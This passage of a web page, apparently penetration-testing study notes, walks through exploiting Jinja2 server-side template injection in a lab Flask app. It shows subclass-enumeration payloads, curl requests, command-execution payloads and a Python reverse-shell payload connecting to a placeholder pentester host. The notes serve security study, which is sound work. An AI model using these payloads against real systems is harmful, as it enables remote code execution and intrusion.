&amp;lt;class &amp;#39;flask.blueprints.BlueprintSetupState&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;unicodedata.UCD&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;__future__._Feature&amp;#39;&amp;gt;]&lt;/a&gt;</span>
<a id=__codelineno-18-12 name=__codelineno-18-12></a><span class=go>                &lt;br/&gt;</span>
<a id=__codelineno-18-13 name=__codelineno-18-13></a><span class=go>                &lt;input type=&quot;submit&quot; value=&quot;execute&quot;&gt;</span>
<a id=__codelineno-18-14 name=__codelineno-18-14></a><span class=go>            &lt;/form&gt;</span>
<a id=__codelineno-18-15 name=__codelineno-18-15></a><span class=go>        &lt;/div&gt;</span>
<a id=__codelineno-18-16 name=__codelineno-18-16></a><span class=go>&lt;SNIP&gt;</span>
<a id=__codelineno-18-17 name=__codelineno-18-17></a><span class=go>&lt;/body&gt;</span>
</code></pre></div> <p>Print out the number and the method names using the following payload <div class=highlight><pre><span></span><code><a id=__codelineno-19-1 name=__codelineno-19-1></a><span class=p>{</span><span class=o>%</span> <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>450</span><span class=p>)</span> <span class=o>%</span><span class=p>}</span> 
<a id=__codelineno-19-2 name=__codelineno-19-2></a><span class=p>{{</span> <span class=n>i</span> <span class=p>}}</span>
<a id=__codelineno-19-3 name=__codelineno-19-3></a><span class=p>{{</span> <span class=s1>&#39;&#39;</span><span class=o>.</span><span class=vm>__class__</span><span class=o>.</span><span class=vm>__mro__</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span><span class=o>.</span><span class=n>__subclasses__</span><span class=p>()[</span><span class=n>i</span><span class=p>]</span><span class=o>.</span><span class=vm>__name__</span> <span class=p>}}</span> 
<a id=__codelineno-19-4 name=__codelineno-19-4></a><span class=p>{</span><span class=o>%</span> <span class=n>endfor</span> <span class=o>%</span><span class=p>}</span>
</code></pre></div></p> <div class=highlight><pre><span></span><code><a id=__codelineno-20-1 name=__codelineno-20-1></a><span class=gp>hrmns@htb[/htb]$ </span>curl -gs <span class=s2>&quot;http://&lt;TARGET IP&gt;:&lt;PORT&gt;/execute?cmd=%7B%25%20for%20i%20in%20range%28450%29%20%25%7D%20%7B%7B%20i%20%7D%7D%20%7B%7B%20%27%27.__class__.__mro__%5B1%5D.__subclasses__%28%29%5Bi%5D.__name__%20%7D%7D%20%7B%25%20endfor%20%25%7D&quot;</span>
<a id=__codelineno-20-2 name=__codelineno-20-2></a>
<a id=__codelineno-20-3 name=__codelineno-20-3></a><span class=go>&lt;SNIP&gt;</span>
<a id=__codelineno-20-4 name=__codelineno-20-4></a><span class=go>&lt;body&gt;</span>
<a id=__codelineno-20-5 name=__codelineno-20-5></a><span class=go>    &lt;div id=&quot;desktop&quot;&gt;</span>
<a id=__codelineno-20-6 name=__codelineno-20-6></a><span class=go>        &lt;div class=&quot;window&quot; data-title=&quot;Run&quot;&gt;</span>
<a id=__codelineno-20-7 name=__codelineno-20-7></a><span class=go>            &lt;form action=&quot;/execute&quot; method=&quot;get&quot;&gt;</span>
<a id=__codelineno-20-8 name=__codelineno-20-8></a><span class=go>                &lt;a&gt;C:\&gt;&lt;input type=&quot;text&quot; name=&quot;cmd&quot; id=&quot;command&quot;&gt;&lt;/a&gt;</span>
<a id=__codelineno-20-9 name=__codelineno-20-9></a><span class=go>                &lt;br/&gt;</span>
<a id=__codelineno-20-10 name=__codelineno-20-10></a><span class=go>                &lt;a&gt; 0 type  1 weakref  2 weakcallableproxy  3 weakproxy  4 int  5 bytearray  6 bytes  7 list  8 NoneType  9 NotImplementedType  10 traceback  11 super  12 range  13 dict  14 dict_keys  15 dict_values  16 dict_items  17 dict_reversekeyiterator  18 dict_reversevalueiterator  19 dict_reverseitemiterator  20 odict_iterator  21 set  22 str  23 slice  24 staticmethod  25 complex  26 float  27 frozenset  28 property  29 managedbuffer  30 memoryview  31 tuple  32 enumerate  33 reversed  34 stderrprinter  35 code  36 frame  37 builtin_function_or_method  38 method  39 function  40 mappingproxy  41 generator  42 getset_descriptor  43 wrapper_descriptor  44 method-wrapper  45 ellipsis  46 member_descriptor  47 SimpleNamespace  48 PyCapsule  49 longrange_iterator  50 cell  51 instancemethod  52 classmethod_descriptor  53 method_descriptor  54 callable_iterator  55 iterator  56 PickleBuffer  57 coroutine  58 coroutine_wrapper  59 InterpreterID  60 EncodingMap  61 fieldnameiterator  62 formatteriterator  63 BaseException  64 hamt  65 hamt_array_node  66 hamt_bitmap_node  67 hamt_collision_node  68 keys  69 values  70 items  71 Context  72 ContextVar  73 Token  74 MISSING  75 moduledef  76 module  77 filter  78 map  79 zip  80 _ModuleLock  81 _DummyModuleLock  82 _ModuleLockManager  83 ModuleSpec  84 BuiltinImporter  85 classmethod  86 FrozenImporter  87 _ImportLockContext  88 _localdummy  89 _local  90 lock  91 RLock  92 _IOBase  93 _BytesIOBuffer  94 IncrementalNewlineDecoder  95 ScandirIterator  96 DirEntry  97 WindowsRegistryFinder  98 _LoaderBasics  99 FileLoader  100 _NamespacePath  101 _NamespaceLoader  102 PathFinder  103 FileFinder  104 zipimporter  105 _ZipImportResourceReader  106 Codec  107 IncrementalEncoder  108 IncrementalDecoder  109 StreamReaderWriter  110 StreamRecoder  111 _abc_data  112 ABC  113 dict_itemiterator  114 Hashable  115 Awaitable  116 AsyncIterable  117 async_generator  118 Iterable  119 bytes_iterator  120 bytearray_iterator  121 dict_keyiterator  122 dict_valueiterator  123 list_iterator  124 list_reverseiterator  125 range_iterator  126 set_iterator  127 str_iterator  128 tuple_iterator  129 Sized  130 Container  131 Callable  132 _wrap_close  133 Quitter  134 _Printer  135 _Helper  136 itemgetter  137 attrgetter  138 methodcaller  139 accumulate  140 combinations  141 combinations_with_replacement  142 cycle  143 dropwhile  144 takewhile  145 islice  146 starmap  147 chain  148 compress  149 filterfalse  150 count  151 zip_longest  152 permutations  153 product  154 repeat  155 groupby  156 _grouper  157 _tee  158 _tee_dataobject  159 Repr  160 deque  161 _deque_iterator  162 _deque_reverse_iterator  163 _tuplegetter  164 _Link  165 partial  166 _lru_cache_wrapper  167 partialmethod  168 singledispatchmethod  169 cached_property  170 DynamicClassAttribute  171 _GeneratorWrapper  172 auto  173 Enum  174 Pattern  175 Match  176 SRE_Scanner  177 State  178 SubPattern  179 Tokenizer  180 Scanner  181 Template  182 Formatter  183 ContextDecorator  184 _GeneratorContextManagerBase  185 _BaseExitStack  186 _Final  187 _Immutable  188 Generic  189 _TypingEmpty  190 _TypingEllipsis  191 NamedTuple  192 typing.io  193 typing.re  194 AST  195 _MarkupEscapeHelper  196 poll  197 epoll  198 BaseSelector  199 socket  200 _IterationGuard  201 WeakSet  202 _RLock  203 Condition  204 Semaphore  205 Event  206 Barrier  207 Thread  208 BaseServer  209 ForkingMixIn  210 _NoThreads  211 ThreadingMixIn  212 BaseRequestHandler  213 WarningMessage  214 catch_warnings  215 date  216 timedelta  217 time  218 tzinfo  219 _Info  220 finalize  221 sha384  222 sha512  223 Random  224 _ResultMixinStr  225 _ResultMixinBytes  226 _NetlocResultMixinBase  227 _localized_month  228 _localized_day  229 Calendar  230 different_locale  231 AddrlistClass  232 Struct  233 unpack_iterator  234 Charset  235 Header  236 _ValueFormatter  237 _PolicyBase  238 BufferedSubFile  239 FeedParser  240 Parser  241 BytesParser  242 Message  243 HTTPConnection  244 _SSLContext  245 _SSLSocket  246 MemoryBIO  247 Session  248 SSLObject  249 MimeTypes  250 Compress  251 Decompress  252 BZ2Compressor  253 BZ2Decompressor  254 LZMACompressor  255 LZMADecompressor  256 Bytecode  257 Untokenizer  258 BlockFinder  259 _void  260 _empty  261 Parameter  262 BoundArguments  263 Signature  264 FrameSummary  265 TracebackException  266 LogRecord  267 PercentStyle  268 Formatter  269 BufferingFormatter  270 Filter  271 Filterer  272 PlaceHolder  273 Manager  274 LoggerAdapter  275 _Missing  276 Aborter  277 Href  278 CompletedProcess  279 Popen  280 HASH  281 blake2b  282 blake2s  283 sha3_224  284 sha3_256  285 sha3_384  286 sha3_512  287 shake_128  288 shake_256  289 _RandomNameSequence  290 _TemporaryFileCloser  291 _TemporaryFileWrapper  292 SpooledTemporaryFile  293 TemporaryDirectory  294 Request  295 OpenerDirector  296 BaseHandler  297 HTTPPasswordMgr  298 AbstractBasicAuthHandler  299 AbstractDigestAuthHandler  300 URLopener  301 ftpwrapper  302 Cookie  303 CookiePolicy  304 Absent  305 CookieJar  306 ImmutableListMixin  307 ImmutableDictMixin  308 _omd_bucket  309 Headers  310 ImmutableHeadersMixin  311 IfRange  312 Range  313 ContentRange  314 FileStorage  315 _HAS_DEFAULT_FACTORY_CLASS  316 _MISSING_TYPE  317 _FIELD_BASE  318 InitVar  319 Field  320 _DataclassParams  321 Event  322 MultipartDecoder  323 MultipartEncoder  324 Finder  325 Loader  326 ResourceReader  327 ImpImporter  328 ImpLoader  329 HMAC  330 ClosingIterator  331 FileWrapper  332 _RangeWrapper  333 HTMLBuilder  334 AcceptMixin  335 AuthorizationMixin  336 WWWAuthenticateMixin  337 Scanner  338 Encoder  339 JSONDecoder  340 JSONEncoder  341 FormDataParser  342 MultiPartParser  343 UserAgent  344 _UserAgentParser  345 Request  346 StreamOnlyMixin  347 Response  348 ResponseStream  349 ResponseStreamMixin  350 CommonRequestDescriptorsMixin  351 CommonResponseDescriptorsMixin  352 ETagRequestMixin  353 ETagResponseMixin  354 UserAgentMixin  355 _TestCookieHeaders  356 _TestCookieResponse  357 EnvironBuilder  358 Client  359 Decimal  360 Context  361 SignalDictMixin  362 ContextManager  363 Number  364 UUID  365 Unpickler  366 Pickler  367 Pdata  368 PicklerMemoProxy  369 UnpicklerMemoProxy  370 _Framer  371 _Unframer  372 _Pickler  373 _Unpickler  374 Bucket  375 BytecodeCache  376 MissingType  377 LRUCache  378 Cycler  379 Joiner  380 Namespace  381 EvalContext  382 Node  383 NodeVisitor  384 Symbols  385 MacroRef  386 Frame  387 TemplateReference  388 Context  389 BlockReference  390 LoopContext  391 Macro  392 Undefined  393 NodeVisitor  394 Failure  395 TokenStreamIterator  396 TokenStream  397 Lexer  398 Parser  399 Environment  400 Template  401 TemplateModule  402 TemplateExpression  403 TemplateStream  404 BaseLoader  405 Local  406 LocalStack  407 LocalManager  408 _ProxyLookup  409 LocalProxy  410 SequenceMatcher  411 Differ  412 HtmlDiff  413 _safe_key  414 PrettyPrinter  415 RuleFactory  416 RuleTemplate  417 BaseConverter  418 Map  419 MapAdapter  420 NullTranslations  421 _FixupStream  422 _AtomicFile  423 LazyFile  424 KeepOpenFile  425 PacifyFlushWrapper  426 ParamType  427 Option  428 Argument  429 ParsingState  430 OptionParser  431 HelpFormatter  432 Context  433 BaseCommand  434 Parameter  435 Namespace  436 _FakeSignal  437 DispatchingApp  438 ScriptInfo  439 ConfigAttribute  440 _AppCtxGlobals  441 AppContext  442 RequestContext  443 Scaffold  444 _CompactJSON  445 SigningAlgorithm  446 Signer  447 Serializer  448 JSONTag  449 TaggedJSONSerializer &lt;/a&gt;</span>
<a id=__codelineno-20-11 name=__codelineno-20-11></a><span class=go>                &lt;br/&gt;</span>
<a id=__codelineno-20-12 name=__codelineno-20-12></a><span class=go>                &lt;input type=&quot;submit&quot; value=&quot;execute&quot;&gt;</span>
<a id=__codelineno-20-13 name=__codelineno-20-13></a><span class=go>            &lt;/form&gt;</span>
<a id=__codelineno-20-14 name=__codelineno-20-14></a><span class=go>        &lt;/div&gt;</span>
<a id=__codelineno-20-15 name=__codelineno-20-15></a><span class=go>&lt;SNIP&gt;</span>
<a id=__codelineno-20-16 name=__codelineno-20-16></a><span class=go>&lt;/body&gt;</span>
</code></pre></div> <p>In the application's response we can see that <code>catch_warnings</code> is located at index #214. We have everything we need to construct an RCE payload, such as the following <div class=highlight><pre><span></span><code><a id=__codelineno-21-1 name=__codelineno-21-1></a><span class=p>{{</span><span class=s1>&#39;&#39;</span><span class=o>.</span><span class=vm>__class__</span><span class=o>.</span><span class=vm>__mro__</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span><span class=o>.</span><span class=n>__subclasses__</span><span class=p>()[</span><span class=mi>214</span><span class=p>]()</span><span class=o>.</span><span class=n>_module</span><span class=o>.</span><span class=n>__builtins__</span><span class=p>[</span><span class=s1>&#39;__import__&#39;</span><span class=p>](</span><span class=s1>&#39;os&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>system</span><span class=p>(</span><span class=s2>&quot;touch /tmp/test1&quot;</span><span class=p>)</span> <span class=p>}}</span>
</code></pre></div></p> <div class=highlight><pre><span></span><code><a id=__codelineno-22-1 name=__codelineno-22-1></a><span class=gp>hrmns@htb[/htb]$ </span>curl -gs <span class=s2>&quot;http://&lt;TARGET IP&gt;:&lt;PORT&gt;/execute?cmd=%7B%7B%27%27.__class__.__mro__%5B1%5D.__subclasses__%28%29%5B214%5D%28%29._module.__builtins__%5B%27__import__%27%5D%28%27os%27%29.system%28%22touch%20%2Ftmp%2Ftest1%22%29%20%7D%7D&quot;</span>
<a id=__codelineno-22-2 name=__codelineno-22-2></a>
<a id=__codelineno-22-3 name=__codelineno-22-3></a><span class=go>&lt;SNIP&gt;</span>
<a id=__codelineno-22-4 name=__codelineno-22-4></a><span class=go>&lt;body&gt;</span>
<a id=__codelineno-22-5 name=__codelineno-22-5></a><span class=go>    &lt;div id=&quot;desktop&quot;&gt;</span>
<a id=__codelineno-22-6 name=__codelineno-22-6></a><span class=go>        &lt;div class=&quot;window&quot; data-title=&quot;Run&quot;&gt;</span>
<a id=__codelineno-22-7 name=__codelineno-22-7></a><span class=go>            &lt;form action=&quot;/execute&quot; method=&quot;get&quot;&gt;</span>
<a id=__codelineno-22-8 name=__codelineno-22-8></a><span class=go>                &lt;a&gt;C:\&gt;&lt;input type=&quot;text&quot; name=&quot;cmd&quot; id=&quot;command&quot;&gt;&lt;/a&gt;</span>
<a id=__codelineno-22-9 name=__codelineno-22-9></a><span class=go>                &lt;br/&gt;</span>
<a id=__codelineno-22-10 name=__codelineno-22-10></a><span class=go>                &lt;a&gt;0&lt;/a&gt;</span>
<a id=__codelineno-22-11 name=__codelineno-22-11></a><span class=go>                &lt;br/&gt;</span>
<a id=__codelineno-22-12 name=__codelineno-22-12></a><span class=go>                &lt;input type=&quot;submit&quot; value=&quot;execute&quot;&gt;</span>
<a id=__codelineno-22-13 name=__codelineno-22-13></a><span class=go>            &lt;/form&gt;</span>
<a id=__codelineno-22-14 name=__codelineno-22-14></a><span class=go>        &lt;/div&gt;</span>
<a id=__codelineno-22-15 name=__codelineno-22-15></a><span class=go>&lt;SNIP&gt;</span>
<a id=__codelineno-22-16 name=__codelineno-22-16></a><span class=go>&lt;/body&gt;</span>
</code></pre></div> <p>The application returns <code>0</code> in its response. This is the return of the value of the command we just executed. <code>0</code> indicates that the command was executed without errors.</p> <p>We can identify if <code>test1</code> was created using the following payload</p> <div class=highlight><pre><span></span><code><a id=__codelineno-23-1 name=__codelineno-23-1></a><span class=p>{{</span><span class=s1>&#39;&#39;</span><span class=o>.</span><span class=vm>__class__</span><span class=o>.</span><span class=vm>__mro__</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span><span class=o>.</span><span class=n>__subclasses__</span><span class=p>()[</span><span class=mi>214</span><span class=p>]()</span><span class=o>.</span><span class=n>_module</span><span class=o>.</span><span class=n>__builtins__</span><span class=p>[</span><span class=s1>&#39;__import__&#39;</span><span class=p>](</span><span class=s1>&#39;os&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>popen</span><span class=p>(</span><span class=s1>&#39;ls /tmp&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>read</span><span class=p>()}}</span>
</code></pre></div> <div class=highlight><pre><span></span><code><a id=__codelineno-24-1 name=__codelineno-24-1></a><span class=gp>hrmns@htb[/htb]$ </span>curl -gs <span class=s2>&quot;http://&lt;TARGET IP&gt;:&lt;PORT&gt;/execute?cmd=%7B%7B%27%27.__class__.__mro__%5B1%5D.__subclasses__%28%29%5B214%5D%28%29._module.__builtins__%5B%27__import__%27%5D%28%27os%27%29.popen%28%27ls%20%2Ftmp%27%29.read%28%29%7D%7D&quot;</span>
<a id=__codelineno-24-2 name=__codelineno-24-2></a>
<a id=__codelineno-24-3 name=__codelineno-24-3></a><span class=go>&lt;SNIP&gt;</span>
<a id=__codelineno-24-4 name=__codelineno-24-4></a><span class=go>&lt;body&gt;</span>
<a id=__codelineno-24-5 name=__codelineno-24-5></a><span class=go>    &lt;div id=&quot;desktop&quot;&gt;</span>
<a id=__codelineno-24-6 name=__codelineno-24-6></a><span class=go>        &lt;div class=&quot;window&quot; data-title=&quot;Run&quot;&gt;</span>
<a id=__codelineno-24-7 name=__codelineno-24-7></a><span class=go>            &lt;form action=&quot;/execute&quot; method=&quot;get&quot;&gt;</span>
<a id=__codelineno-24-8 name=__codelineno-24-8></a><span class=go>                &lt;a&gt;C:\&gt;&lt;input type=&quot;text&quot; name=&quot;cmd&quot; id=&quot;command&quot;&gt;&lt;/a&gt;</span>
<a id=__codelineno-24-9 name=__codelineno-24-9></a><span class=go>                &lt;br/&gt;</span>
<a id=__codelineno-24-10 name=__codelineno-24-10></a><span class=go>                &lt;a&gt;test1</span>
<a id=__codelineno-24-11 name=__codelineno-24-11></a><span class=go>tmpv4tucw2b</span>
<a id=__codelineno-24-12 name=__codelineno-24-12></a><span class=go>&lt;/a&gt;</span>
<a id=__codelineno-24-13 name=__codelineno-24-13></a><span class=go>                &lt;br/&gt;</span>
<a id=__codelineno-24-14 name=__codelineno-24-14></a><span class=go>                &lt;input type=&quot;submit&quot; value=&quot;execute&quot;&gt;</span>
<a id=__codelineno-24-15 name=__codelineno-24-15></a><span class=go>            &lt;/form&gt;</span>
<a id=__codelineno-24-16 name=__codelineno-24-16></a><span class=go>        &lt;/div&gt;</span>
<a id=__codelineno-24-17 name=__codelineno-24-17></a><span class=go>&lt;SNIP&gt;</span>
<a id=__codelineno-24-18 name=__codelineno-24-18></a><span class=go>&lt;/body&gt;</span>
</code></pre></div> <p>We can use some specific functions to facilitate the exploitation of Jinja2 SSTI vulnerabilities. Those are <code>request</code> and <code>lipsum</code>. </p> <div class=highlight><pre><span></span><code><a id=__codelineno-25-1 name=__codelineno-25-1></a><span class=p>{{</span><span class=n>request</span><span class=o>.</span><span class=n>application</span><span class=o>.</span><span class=vm>__globals__</span><span class=o>.</span><span class=n>__builtins__</span><span class=o>.</span><span class=n>__import__</span><span class=p>(</span><span class=s1>&#39;os&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>popen</span><span class=p>(</span><span class=s1>&#39;id&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>read</span><span class=p>()}}</span>
</code></pre></div> <div class=highlight><pre><span></span><code><a id=__codelineno-26-1 name=__codelineno-26-1></a><span class=p>{{</span><span class=n>lipsum</span><span class=o>.</span><span class=vm>__globals__</span><span class=o>.</span><span class=n>os</span><span class=o>.</span><span class=n>popen</span><span class=p>(</span><span class=s1>&#39;id&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>read</span><span class=p>()}}</span>
</code></pre></div> <p>A reverse shell can also be established through a payload such as the below</p> <div class=highlight><pre><span></span><code><a id=__codelineno-27-1 name=__codelineno-27-1></a><span class=p>{{</span><span class=s1>&#39;&#39;</span><span class=o>.</span><span class=vm>__class__</span><span class=o>.</span><span class=vm>__mro__</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span><span class=o>.</span><span class=n>__subclasses__</span><span class=p>()[</span><span class=mi>214</span><span class=p>]()</span><span class=o>.</span><span class=n>_module</span><span class=o>.</span><span class=n>__builtins__</span><span class=p>[</span><span class=s1>&#39;__import__&#39;</span><span class=p>](</span><span class=s1>&#39;os&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>popen</span><span class=p>(</span><span class=s1>&#39;python -c </span><span class=se>\&#39;</span><span class=s1>socket=__import__(&quot;socket&quot;);os=__import__(&quot;os&quot;);pty=__import__(&quot;pty&quot;);s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;&lt;PENTESTER_IP&gt;&quot;,&lt;PENTESTER_PORT&gt;));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(&quot;/bin/sh&quot;)</span><span class=se>\&#39;</span><span class=s1>&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>read</span><span class=p>()}}</span>
</code></pre></div> </article> </div> </div> <a href=# class="md-top md-icon" data-md-component=top data-md-state=hidden> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8v12z"/></svg> Back to top </a> </main> <footer class=md-footer> <nav class="md-footer__inner md-grid" aria-label=Footer> <a href=../ssti_example2/ class="md-footer__link md-footer__link--prev" aria-label="Previous: SSTI Example2" rel=prev> <div class="md-footer__button md-icon"> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg> </div> <div class=md-footer__title> <div class=md-ellipsis> <span class=md-footer__direction> Previous </span> SSTI Example2 </div> </div> </a> <a href=../../file_inclusion/intro/ class="md-footer__link md-footer__link--next" aria-label="Next: Introduction" rel=next> <div class=md-footer__title> <div class=md-ellipsis> <span class=md-footer__direction> Next </span> Introduction </div> </div> <div class="md-footer__button md-icon"> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11H4z"/></svg> </div> </a> </nav> <div class="md-footer-meta md-typeset"> <div class="md-footer-meta__inner md-grid"> <div class=md-copyright> <div class=md-copyright__highlight> Copyright &copy; 2021 - 2022 dh </div> </div> <div class=md-social> <a href=https://github.com/hrmnsio target=_blank rel=noopener title=github.com class=md-social__link> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 496 512"><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg> </a> <a href=https://twitter.com/dhrmns target=_blank rel=noopener title=twitter.com class=md-social__link> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 512 512"><path d="M459.37 151.716c.325 4.548.325 9.097.325 13.645 0 138.72-105.583 298.558-298.558 298.558-59.452 0-114.68-17.219-161.137-47.106 8.447.974 16.568 1.299 25.34 1.299 49.055 0 94.213-16.568 130.274-44.832-46.132-.975-84.792-31.188-98.112-72.772 6.498.974 12.995 1.624 19.818 1.624 9.421 0 18.843-1.3 27.614-3.573-48.081-9.747-84.143-51.98-84.143-102.985v-1.299c13.969 7.797 30.214 12.67 47.431 13.319-28.264-18.843-46.781-51.005-46.781-87.391 0-19.492 5.197-37.36 14.294-52.954 51.655 63.675 129.3 105.258 216.365 109.807-1.624-7.797-2.599-15.918-2.599-24.04 0-57.828 46.782-104.934 104.934-104.934 30.213 0 57.502 12.67 76.67 33.137 23.715-4.548 46.456-13.32 66.599-25.34-7.798 24.366-24.366 44.833-46.132 57.827 21.117-2.273 41.584-8.122 60.426-16.243-14.292 20.791-32.161 39.308-52.628 54.253z"/></svg> </a> </div> </div> </div> </footer> </div> <div class=md-dialog data-md-component=dialog> <div class="md-dialog__inner md-typeset"></div> </div> <script id=__config type=application/json>{"base": "../..", "features": ["content.code.annotate", "navigation.indexes", "navigation.sections", "navigation.tabs", "navigation.top", "navigation.tracking", "search.highlight", "search.share", "search.suggest"], "translations": {"clipboard.copy": "Copy to clipboard", "clipboard.copied": "Copied to clipboard", "search.config.lang": "en", "search.config.pipeline": "trimmer, stopWordFilter", "search.config.separator": "[\\s\\-]+", "search.placeholder": "Search", "search.result.placeholder": "Type to start searching", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.term.missing": "Missing", "select.version.title": "Select version"}, "search": "../../assets/javascripts/workers/search.361d90f1.min.js"}</script> <script src=../../assets/javascripts/bundle.289a2a4b.min.js></script> </body> </html>